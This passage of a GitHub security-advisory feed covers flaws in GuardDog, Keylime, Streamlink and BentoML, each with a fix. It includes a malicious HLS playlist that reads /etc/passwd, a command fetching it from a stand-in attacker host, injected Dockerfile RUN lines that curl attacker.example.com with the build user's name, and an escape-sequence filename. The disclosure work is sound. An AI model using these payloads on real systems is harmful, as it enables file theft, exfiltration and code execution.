-        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
-<p>GuardDog includes attacker-controlled filenames, file locations, messages, and code snippets in its default human-readable output without escaping terminal control characters. A malicious package can therefore inject ANSI or OSC escape sequences into analyst terminals or CI logs.</p>
-<h1 id="description">Description</h1>
-<p>The finding formatter stores file paths and snippets from scanned content:</p>
-<pre><code class="language-python">location = file_path + ":" + str(start_line)
-finding = {
-    "location": location,
-    "code": code,
-    "message": result["extra"]["message"],
-}
-</code></pre>
-<p>The human-readable reporter later prints these values directly:</p>
-<pre><code class="language-python">"  * " + finding["message"] + " at " + finding["location"] + "\n    " + _format_code_line_for_output(finding["code"])
-</code></pre>
-<p>No escaping is applied for control characters such as <code>\x1b</code>. A malicious package can therefore ship a filename like:</p>
-<pre><code class="language-text">evil\x1b[2J.py
-</code></pre>
-<p>or matched source lines containing terminal escapes, which survive into the final CLI output.</p>
-<h1 id="reproduction-summary">Reproduction summary</h1>
-<ol>
-<li>Create a file whose name contains <code>\x1b[2J</code>.</li>
-<li>Feed a semgrep-style result referencing that file into <code>Analyzer._format_semgrep_response()</code>.</li>
-<li>Render the result with <code>HumanReadableReporter.print_scan_results()</code>.</li>
-<li>The output string contains the raw escape bytes, which a terminal may interpret.</li>
-</ol>
-<h1 id="key-code-paths">Key code paths</h1>
-<ul>
-<li><code>guarddog/analyzer/analyzer.py:377-392</code></li>
-<li><code>guarddog/reporters/human_readable.py:36-42</code></li>
-<li><code>guarddog/reporters/human_readable.py:84-91</code></li>
-</ul>
-<h1 id="practical-impact">Practical impact</h1>
-<p>This can be used to:</p>
-<ul>
-<li>clear or rewrite analyst terminal output</li>
-<li>inject misleading or spoofed log content in CI</li>
-<li>emit clickable OSC 8 hyperlinks or title changes in compatible terminals</li>
-</ul>
-<h1 id="prior-public-disclosure-check">Prior public disclosure check</h1>
-<p>As of 2026-03-18, no matching public GitHub advisory, CVE, or public repo issue was found for this specific bug.</p>
-<h1 id="suggested-fix">Suggested fix</h1>
-<p>Escape or strip terminal control characters before rendering any attacker-controlled value in human-readable output. This should cover package names, file paths, messages, and code snippets.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/DataDog/guarddog/security/advisories/GHSA-m5p4-gvpx-4mvr">https://github.com/DataDog/guarddog/security/advisories/GHSA-m5p4-gvpx-4mvr</a></li>
-<li><a href="https://github.com/advisories/GHSA-m5p4-gvpx-4mvr">https://github.com/advisories/GHSA-m5p4-gvpx-4mvr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-m5p4-gvpx-4mvr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-11T14:43:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[keylime] Keylime has a hardcoded attestation challenge nonce that allows replay attacks]]></title>
-        <id>https://github.com/advisories/GHSA-q8w6-w55c-ccv5</id>
-        <link href="https://github.com/advisories/GHSA-q8w6-w55c-ccv5"/>
-        <updated>2026-05-11T14:42:47.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="cve-2026-6420-hardcoded-attestation-challenge-nonce-allows-replay-attacks">CVE-2026-6420: Hardcoded attestation challenge nonce allows replay attacks</h2>
-<h3 id="impact">Impact</h3>
-<p>The <code>CertificationParameters.generate_challenge()</code> method in the push attestation protocol uses a hardcoded challenge nonce instead of generating a cryptographically random value. This removes the nonce-based replay protection from TPM quote attestation.</p>
-<p>An attacker with root access on a monitored agent node can exploit this by stockpiling valid TPM quotes (using <code>tpm2_quote</code> with the known nonce) before compromising the system, then replaying them to evade detection by the verifier. The push attestation timeout (~10s) constrains the generation window, but TPM throughput allows stockpiling ~50-200 quotes, enabling approximately 8-33 minutes of undetected compromise with default settings.</p>
-<p>The attack is limited to a single agent node (AK signature binding prevents cross-agent replay). The pull-mode (legacy) attestation path is not affected.</p>
-<p><strong>Affected versions:</strong> &gt;= 7.14.0, &lt;= 7.14.1</p>
-<p><strong>CVSS:</strong> 6.3 Medium (<code>CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:L</code>)</p>
-<table>
-<thead>
-<tr>
-<th>Metric</th>
-<th>Value</th>
-<th>Rationale</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>AV</td>
-<td>Local</td>
-<td>Exploitation requires local access to the agent machine (stop agent, access TPM, run replacement). The network transmission of quotes to the verifier is normal protocol operation.</td>
-</tr>
-<tr>
-<td>AC</td>
-<td>Low</td>
-<td>Deterministic attack: publicly visible nonce, standard <code>tpm2-tools</code>, no race conditions.</td>
-</tr>
-<tr>
-<td>PR</td>
-<td>High</td>
-<td>Root on a legitimate enrolled node is required. The vulnerability does not help gain access -- it only helps evade detection after root is obtained. No value against a machine the attacker already controls.</td>
-</tr>
-<tr>
-<td>UI</td>
-<td>None</td>
-<td>Fully automated after initial setup.</td>
-</tr>
-<tr>
-<td>S</td>
-<td>Unchanged</td>
-<td>AK signature binding confines impact to the single compromised agent.</td>
-</tr>
-<tr>
-<td>C</td>
-<td>High</td>
-<td>Compromised node continues receiving bootstrap keys, payloads, and secrets intended for trusted nodes.</td>
-</tr>
-<tr>
-<td>I</td>
-<td>High</td>
-<td>Verifier cannot distinguish a healthy system from a fully compromised one during the evasion window.</td>
-</tr>
-<tr>
-<td>A</td>
-<td>Low</td>
-<td>Only the compromised agent's revocation and incident response are suppressed; the system as a whole remains operational.</td>
-</tr>
-</tbody></table>
-<p>The base score does not fully capture the operational severity: Keylime exists to detect machine compromise, so 8-33 minutes of undetected compromise is operationally critical. The fix is a one-line change and should be applied immediately regardless of the base score.</p>
-<h3 id="patches">Patches</h3>
-<p>The fix restores the original random nonce generation (one-line change in <code>keylime/models/verifier/evidence.py</code>):</p>
-<pre><code class="language-python"># Before (vulnerable):
-def generate_challenge(self, bit_length):
-    # self.challenge = Nonce.generate(bit_length)
-    self.challenge = bytes.fromhex("49beed365aac777dae23564f5ad0ec")
-
-# After (fixed):
-def generate_challenge(self, bit_length):
-    self.challenge = Nonce.generate(bit_length)
-</code></pre>
-<p>Users should upgrade to the version containing this fix (7.14.2).</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>There is no complete workaround. The following existing mechanisms provide partial mitigation and are already active by default (no configuration needed):</p>
-<ol>
-<li><strong>TPM clock monotonicity check</strong> limits each distinct stockpiled quote to a single use, bounding the total evasion time.</li>
-<li><strong>Push attestation timeout</strong> (default 10s) prevents the attacker from going silent and constrains the quote generation window.</li>
-</ol>
-<p>Reducing <code>quote_interval</code> increases the attestation frequency but does not prevent the stockpiling attack.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>CWE-329: Generation of Predictable IV/Nonce (primary -- hardcoded nonce in cryptographic attestation protocol)</li>
-<li>CWE-547: Use of Hard-Coded, Security-relevant Constants (hardcoded constant left in production code)</li>
-<li>CWE-294: Authentication Bypass by Capture-replay (consequence -- enables replay attacks)</li>
-<li>CWE-1241: Use of Predictable Algorithm in Random Number Generator</li>
-<li>Introducing commit: <a href="https://github.com/keylime/keylime/commit/2bf91197"><code>2bf91197</code></a> via <a href="https://github.com/keylime/keylime/pull/1814">PR #1814</a></li>
-<li>TCG TPM 2.0 Library Specification, Part 1, Section 18.4 (TPM2_Quote)</li>
-<li>IETF RATS Architecture (RFC 9334), Section 8 (Freshness)</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/keylime/keylime/security/advisories/GHSA-q8w6-w55c-ccv5">https://github.com/keylime/keylime/security/advisories/GHSA-q8w6-w55c-ccv5</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6420">https://nvd.nist.gov/vuln/detail/CVE-2026-6420</a></li>
-<li><a href="https://access.redhat.com/security/cve/CVE-2026-6420">https://access.redhat.com/security/cve/CVE-2026-6420</a></li>
-<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2458889">https://bugzilla.redhat.com/show_bug.cgi?id=2458889</a></li>
-<li><a href="https://github.com/advisories/GHSA-q8w6-w55c-ccv5">https://github.com/advisories/GHSA-q8w6-w55c-ccv5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-q8w6-w55c-ccv5</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-11T14:42:46.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[streamlink] Streamlink has an arbitrary local file read via file:// URI in HLS and DASH]]></title>
-        <id>https://github.com/advisories/GHSA-hgqw-6m45-hw5f</id>
-        <link href="https://github.com/advisories/GHSA-hgqw-6m45-hw5f"/>
-        <updated>2026-05-11T14:28:31.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Streamlink's HLS and DASH parsers do not validate the URI scheme of segment entries and other resources. A remote <code>.m3u8</code> HLS playlist or <code>.mpd</code> DASH manifest can list <code>file:///path/to/file</code> as a segment, and streamlink will read that local file and write its contents to the output stream.</p>
-<p>Confirmed on streamlink 8.3.0 (latest release at time of report).</p>
-<h2 id="description">Description</h2>
-<p>Segment URIs from an HLS playlist or DASH manifest are passed to the worker without any scheme check. The underlying HTTP session accepts <code>file://</code> URIs, which resolve against the local filesystem. There is no scheme allowlist at the parser level, so any path readable by the streamlink process is treated as a valid segment.</p>
-<p>The attacker does not need local access to the victim. A playlist/manifest hosted on an attacker-controlled server, fetched by streamlink on the victim's machine, is enough to trigger the read.</p>
-<h2 id="impact">Impact</h2>
-<p>A remote attacker hosting a malicious playlist/manifest can make any client running streamlink against that URL read arbitrary local files within the streamlink process's read scope and write them into the output file.</p>
-<p>Reachable files depend on the user running streamlink. Typical targets: <code>~/.ssh/id_*</code> private keys, <code>~/.aws/credentials</code>, shell history, application config files holding API tokens, and world-readable system files like <code>/etc/passwd</code>.</p>
-<h3 id="affected-scenarios">Affected scenarios</h3>
-<ul>
-<li>Server-side or automated deployments (recording bots, media pipelines, CI jobs processing playlists). The output file is often uploaded, logged, or otherwise exposed, which gives direct disclosure to attacker-reachable locations.</li>
-<li>Interactive desktop use. File contents land on the victim's disk and can leak through secondary channels: the user sharing the recording, cloud sync, backup, etc.</li>
-</ul>
-<p>This bug does not on its own send file contents back to the attacker. The disclosure goes to the output sink. Full exfiltration depends on what happens to that file afterward.</p>
-<h2 id="steps-to-reproduce">Steps to reproduce</h2>
-<p>Tested on streamlink 8.3.0, Linux (Kali).</p>
-<ol>
-<li><p>Save as <code>playlist.m3u8</code>:</p>
-<pre><code class="language-m3u">#EXTM3U
-#EXT-X-VERSION:3
-#EXT-X-TARGETDURATION:5
-#EXT-X-PLAYLIST-TYPE:VOD
-#EXTINF:5.0,
-file:///etc/passwd
-#EXT-X-ENDLIST
-</code></pre>
-</li>
-<li><p>Host the playlist on a remote server reachable by the victim. For testing, a VPS, a tunnel (cloudflared, ngrok), or a static host like GitHub Pages all work.</p>
-</li>
-<li><p>On the victim machine:</p>
-<pre><code class="language-sh">streamlink "hls://https://attacker-host.example/playlist.m3u8" best -o /tmp/proof.ts
-</code></pre>
-</li>
-<li><p>Inspect the output:</p>
-<pre><code class="language-sh">cat /tmp/proof.ts
-</code></pre>
-</li>
-<li><p>The output contains the contents of <code>/etc/passwd</code> from the machine running streamlink.</p>
-</li>
-</ol>
-<h3 id="local-reproduction-equivalent-simpler-to-set-up">Local reproduction (equivalent, simpler to set up):</h3>
-<pre><code class="language-sh">python3 -m http.server 8080    # in directory containing playlist.m3u8
-streamlink "hls://http://127.0.0.1:8080/playlist.m3u8" best -o /tmp/proof.ts
-cat /tmp/proof.ts
-</code></pre>
-<p>The remote case was confirmed independently using a tunnel.</p>
-<h2 id="proposed-remediation">Proposed remediation</h2>
-<p>Allowlist http and https for segment URIs in the HLS parser. Reject any other scheme (file, ftp, data, etc.) at parse time, before the URI reaches the fetcher.</p>
-<p>The check needs to cover:</p>
-<ul>
-<li>Segment URIs in the top-level manifest.</li>
-<li>Segment URIs in nested manifests pulled during playback (variant playlists referenced from a master playlist).</li>
-<li>Other URI fields the fetcher consumes — <code>#EXT-X-KEY</code> and <code>#EXT-X-MAP</code> URIs at minimum. Worth auditing the rest for the same issue.</li>
-</ul>
-<p>The check belongs in the parser, not the fetcher. Putting it next to the untrusted input means downstream callers don't each need to re-implement it, and any future fetcher path inherits the protection by default.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/streamlink/streamlink/security/advisories/GHSA-hgqw-6m45-hw5f">https://github.com/streamlink/streamlink/security/advisories/GHSA-hgqw-6m45-hw5f</a></li>
-<li><a href="https://github.com/advisories/GHSA-hgqw-6m45-hw5f">https://github.com/advisories/GHSA-hgqw-6m45-hw5f</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-hgqw-6m45-hw5f</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-11T14:28:30.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[bentoml] Dockerfile command injection via envs[*].name in bentofile.yaml (sibling fix-bypass of CVE-2026-33744 and CVE-2026-35043)]]></title>
-        <id>https://github.com/advisories/GHSA-w2pm-x38x-jp44</id>
-        <link href="https://github.com/advisories/GHSA-w2pm-x38x-jp44"/>
-        <updated>2026-05-11T14:27:38.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="bentoml-envsname-dockerfile-command-injection--sibling-of-cve-2026-33744--cve-2026-35043">BentoML <code>envs[*].name</code> Dockerfile command injection — sibling of CVE-2026-33744 / CVE-2026-35043</h1>
-<p>A malicious <code>bentofile.yaml</code> containing a newline-injected value in <code>envs[*].name</code> produces unquoted <code>RUN</code> directives in the BentoML-generated Dockerfile. When the victim runs <code>bentoml containerize</code> on the imported bento, those <code>RUN</code> directives execute on the host during <code>docker build</code>. Verified end-to-end on <code>bentoml==1.4.38</code>.</p>
-<h2 id="vulnerable-code">Vulnerable code</h2>
-<p><code>src/bentoml/_internal/container/frontend/dockerfile/templates/base_v2.j2:71-73</code>:</p>
-<pre><code class="language-jinja">{% for env in __bento_envs__ %}
-{% set stage = env.stage | default("all") -%}
-{% if stage != "runtime" -%}
-ARG {{ env.name }}{% if env.value %}={{ env.value | bash_quote }}{% endif %}
-ENV {{ env.name }}=${{ env.name }}
-{% endif -%}
-{% endfor %}
-</code></pre>
-<p><code>env.value</code> is bash-quoted via the <code>bash_quote</code> filter, but <strong><code>env.name</code> is interpolated raw</strong> with no escaping or newline filtering. The template is rendered by <code>_bentoml_impl/docker.generate_dockerfile</code> (the v2 SDK Docker generation path used by <code>bentoml containerize</code> for modern services).</p>
-<h2 id="sibling-relationship-to-existing-cves">Sibling relationship to existing CVEs</h2>
-<p>The earlier patches addressed the same Dockerfile-command-injection class for a different bentofile field:</p>
-<ul>
-<li><strong>CVE-2026-33744 / GHSA-jfjg-vc52-wqvf</strong> (2026-03-25): added <code>bash_quote</code> to <code>system_packages</code> interpolation in Dockerfile templates and <code>images.py</code>.</li>
-<li><strong>CVE-2026-35043 / GHSA-fgv4-6jr3-jgfw</strong> (2026-04-02): added <code>shlex.quote</code> to <code>system_packages</code> in the cloud deployment path (<code>_internal/cloud/deployment.py:1648</code>).</li>
-</ul>
-<p>Both patches limit themselves to <code>system_packages</code>. The <code>envs[*].name</code> field is the same root-cause class (<code>bentofile.yaml</code> value flowing unquoted into a Dockerfile interpretation context) but was never included in the fix scope.</p>
-<h2 id="reproduction">Reproduction</h2>
-<pre><code class="language-bash">pip install bentoml==1.4.38
-python verify_render.py
-</code></pre>
-<p>Expected:</p>
-<pre><code>[*] rendered Dockerfile size: 1789 bytes
-[*] injected RUN lines: 3
-    RUN curl -fsSL http://attacker.example.com/$(whoami)=1
-    RUN curl -fsSL http://attacker.example.com/$(whoami)=$FOO
-    RUN curl -fsSL http://attacker.example.com/$(whoami)
-</code></pre>
-<p>Each injected <code>RUN</code> line is a Dockerfile command that runs during <code>docker build</code>. With <code>$(whoami)</code> shell-substituted by Docker's RUN executor, the example payload exfiltrates the build host's username.</p>
-<h2 id="threat-model">Threat model</h2>
-<ol>
-<li>Attacker authors a malicious bento with a crafted <code>bentofile.yaml</code>.</li>
-<li>Attacker exports the bento (<code>.bento</code> or <code>.tar.gz</code>) and distributes (S3, HTTP, BentoCloud share, etc.).</li>
-<li>Victim imports with <code>bentoml import bento.tar</code>; no validation of <code>envs</code> content.</li>
-<li>Victim runs <code>bentoml containerize</code> to build the container image.</li>
-<li>BentoML renders the Dockerfile with the attacker's <code>envs</code> values, producing injected <code>RUN</code> lines.</li>
-<li><code>docker build</code> (or BuildKit) executes the injected <code>RUN</code> commands on the build host, achieving RCE in the victim's build environment.</li>
-</ol>
-<p>The flow mirrors CVE-2026-33744 exactly, with <code>envs</code> substituted for <code>system_packages</code>.</p>
-<h2 id="suggested-fix">Suggested fix</h2>
-<p>In <code>base_v2.j2</code> lines 71-73, apply the <code>bash_quote</code> filter to <code>env.name</code> (and to the <code>=$VAR</code> reference in the <code>ENV</code> line, since the variable name itself is reused there):</p>
-<pre><code class="language-jinja">ARG {{ env.name | bash_quote }}{% if env.value %}={{ env.value | bash_quote }}{% endif %}
-ENV {{ env.name | bash_quote }}=${{ env.name | bash_quote }}
-</code></pre>
-<p>Better, since <code>env.name</code> is semantically a Dockerfile identifier, validate at the schema level: in <code>bentoml/_internal/bento/build_config.py:BentoEnvSchema</code>, add an <code>attr.validators.matches_re(r"^[A-Za-z_][A-Za-z0-9_]*$")</code> to the <code>name</code> field so newline / shell-metacharacter values are rejected at config load.</p>
-<h2 id="affected-versions">Affected versions</h2>
-<ul>
-<li>bentoml 1.4.38 (verified end-to-end)</li>
-<li>Likely all 1.x versions where <code>_bentoml_impl/docker.py</code> exists; the v2 SDK code path was added before the CVE-2026-33744 / CVE-2026-35043 patches and was not retroactively swept for siblings.</li>
-</ul>
-<h2 id="disclosure">Disclosure</h2>
-<p>Requesting CVE assignment and GHSA publication. Available for additional repro under different distros / frontends, or for a PR with the suggested fix, on request.</p>
-<h2 id="poc-artifacts">PoC artifacts</h2>
-<p>Gated HF repo (request access): <a href="https://huggingface.co/mrw0r57/bentoml-envs-cmdinjection-poc">https://huggingface.co/mrw0r57/bentoml-envs-cmdinjection-poc</a></p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-78f9-r8mh-4xm2">https://github.com/bentoml/BentoML/security/advisories/GHSA-78f9-r8mh-4xm2</a></li>
-<li><a href="https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44">https://github.com/bentoml/BentoML/security/advisories/GHSA-w2pm-x38x-jp44</a></li>
-<li><a href="https://github.com/advisories/GHSA-w2pm-x38x-jp44">https://github.com/advisories/GHSA-w2pm-x38x-jp44</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-w2pm-x38x-jp44</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-11T14:27:37.000Z</published>
     </entry>
 </feed>
